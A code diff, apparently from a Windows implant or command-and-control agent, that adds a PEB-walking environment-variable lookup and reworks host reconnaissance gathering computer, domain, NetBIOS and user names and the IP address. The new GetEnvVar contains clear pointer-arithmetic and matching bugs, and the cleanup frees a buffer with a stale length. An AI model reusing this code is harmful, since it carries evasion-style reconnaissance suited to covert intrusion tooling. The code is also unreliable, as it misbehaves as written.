@@ -3,6 +3,40 @@
 
 typedef HMODULE (*fnLoadLibraryA)( LPCSTR );
 
+FUNC PWSTR GetEnvVar( 
+    _In_ PWSTR EnvVar 
+) {
+    BLACKOUT_INSTANCE
+
+    PWSTR EnvTmp = Instance()->Teb->ProcessEnvironmentBlock->ProcessParameters->Environment;
+
+    while (1)
+	{
+		int j = StringLengthW( EnvTmp );
+
+		if ( !j ) {
+			EnvTmp = NULL;
+			break;
+		}
+
+		if (*(ULONG_PTR*)EnvTmp == *(ULONG_PTR*)EnvVar)
+			break;
+            
+		EnvTmp = EnvTmp + ( j * sizeof(WCHAR) ) + sizeof(WCHAR);
+	}
+
+	if ( EnvTmp ) {
+		int j = StringLengthW( EnvTmp ) * sizeof(WCHAR);
+		
+		for (int i = 0; i <= j; i++) {
+			if ( (WCHAR)EnvTmp[i] == (WCHAR)L'=' )
+				return (PWSTR)&EnvTmp[i + sizeof(WCHAR)];
+		}
+	}
+	
+	return NULL;
+}
+
 FUNC PVOID bkHeapAlloc(
     UINT64 Size
 ) {
@@ -38,20 +72,12 @@ FUNC BOOL bkHeapFree(
 }
 
 FUNC VOID GetComputerInfo(
-	_Out_ PSTR  *Computername,
-	_Out_ PSTR  *Domainname,
-	_Out_ PSTR  *NetBios,
-	_Out_ PSTR  *Username,
-	_Out_ WORD  *ProcessArch,
-	_Out_ DWORD *ProcessType,
-	_Out_ DWORD *ProductType, 
+    _Out_ WORD  *ProcessArch,
+    _Out_ DWORD *ProcessType,
+    _Out_ DWORD *ProductType, 
     _Out_ PSTR  *IpAddress
 ) {
-	BLACKOUT_INSTANCE
-
-	PBYTE ComputerTmp = { 0 };
-	PBYTE DomainTmp   = { 0 };
-	PBYTE NetBiostmp  = { 0 };
+    BLACKOUT_INSTANCE
 
     DWORD ReturnProductTp = 0x00;
     DWORD UserTmpLen = MAX_PATH;
@@ -65,64 +91,42 @@ FUNC VOID GetComputerInfo(
     Instance()->Win32.GetNativeSystemInfo( &SysInf );
 
     Instance()->Win32.GetProductInfo( 
-		Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion, 
-		Instance()->Teb->ProcessEnvironmentBlock->OSMinorVersion, 
-		Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMajorVersion,
-    	Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMinorVersion, &ReturnProductTp 
-	);
+        Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion, 
+        Instance()->Teb->ProcessEnvironmentBlock->OSMinorVersion, 
+        Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMajorVersion,
+        Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMinorVersion, &ReturnProductTp 
+    );
 
     if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &CompTmpLen ) ) {
-        ComputerTmp = bkHeapAlloc( CompTmpLen );
-        if ( ComputerTmp ) {
-            Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, ComputerTmp, &CompTmpLen );
-        }
+        Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, Instance()->Config.CompData.ComputerName, &CompTmpLen );
     }
 
     if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &DomainLen ) ) {
-        DomainTmp = bkHeapAlloc( DomainLen );
-        if ( DomainTmp ) {
-            Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, DomainTmp, &DomainLen );
-        }
+        Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, Instance()->Config.CompData.DomainName, &DomainLen );
     }
 
     if ( !Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &NetBiosLen ) ) {
-        NetBiostmp = bkHeapAlloc( NetBiosLen );
-        if ( NetBiostmp ) {
-            Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, NetBiostmp, &NetBiosLen );
+        Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, Instance()->Config.CompData.NetBios, &NetBiosLen );
+    }
+
+    ULONG AdapterInfoSize = 0;
+    PIP_ADAPTER_INFO Adapters = NULL;
+
+    if ( Instance()->Win32.GetAdaptersInfo( NULL, &AdapterInfoSize ) == ERROR_BUFFER_OVERFLOW ) {
+        Adapters = bkHeapAlloc( AdapterInfoSize );
+        if (Adapters) {
+            Instance()->Win32.GetAdaptersInfo( Adapters, &AdapterInfoSize );
         }
     }
 
-    PIP_ADAPTER_INFO Adapters = { 0 };
-    Instance()->Win32.GetAdaptersInfo( NULL, &Length );
-    Adapters = bkHeapAlloc( Length );
-    Instance()->Win32.GetAdaptersInfo( Adapters, &Length );
-
-    PVOID UserTmp = bkHeapAlloc( UserTmpLen );
-
-	Instance()->Win32.GetUserNameA( UserTmp, &UserTmpLen );
-
-	*Username 	  = UserTmp;
-	*Computername = ComputerTmp;
-	*Domainname   = DomainTmp;
-	*NetBios      = NetBiostmp;
-	*ProcessArch  = SysInf.wProcessorArchitecture;
-	*ProcessType  = SysInf.dwProcessorType;
-	*ProductType  = ReturnProductTp;
-    *IpAddress    = Adapters->IpAddressList.IpAddress.String;
+    Instance()->Win32.GetUserNameA( Instance()->Config.CompData.UserName, &UserTmpLen );
+    
+    *ProcessArch  = SysInf.wProcessorArchitecture;
+    *ProcessType  = SysInf.dwProcessorType;
+    *ProductType  = ReturnProductTp;
+    *IpAddress    = (Adapters && Adapters->IpAddressList.IpAddress.String[0]) ? Adapters->IpAddressList.IpAddress.String : NULL;
 
 LeaveFunc:
-    if ( UserTmp )
-        bkHeapFree( UserTmp, UserTmpLen );
-
-	if ( ComputerTmp ) 
-        bkHeapFree( ComputerTmp, CompTmpLen );
-
-	if ( NetBiostmp ) 
-        bkHeapFree( NetBiostmp, NetBiosLen );
-
-	if ( DomainTmp ) 
-        bkHeapFree( DomainTmp, DomainLen );
-
     if ( Adapters ) 
         bkHeapFree( Adapters, Length );
 
